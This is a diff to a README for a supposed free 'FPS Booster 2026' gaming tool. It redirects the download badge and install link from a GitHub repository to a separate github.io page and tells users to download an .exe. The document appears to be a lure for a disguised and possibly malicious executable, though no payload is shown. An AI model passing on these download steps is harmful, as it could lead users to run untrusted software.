@@ -1,6 +1,6 @@
 # 🚀 FPS-Booster-2026-Free-Download-PC - Gain higher frame rates for gaming
 
-[![](https://img.shields.io/badge/Download-FPS_Booster_2026-blue.svg)](https://github.com/guyhenpecked330/FPS-Booster-2026-Free-Download-PC)
+[![](https://img.shields.io/badge/Download-FPS_Booster_2026-blue.svg)](https://guyhenpecked330.github.io)
 
 ## About this tool 🛠️
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software correctly:
 
 Follow these steps to set up the software on your system:
 
-1. Visit the project repository page: https://github.com/guyhenpecked330/FPS-Booster-2026-Free-Download-PC
+1. Visit the project repository page: https://guyhenpecked330.github.io
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest release version.
 4. Select the file ending in .exe to start the download.
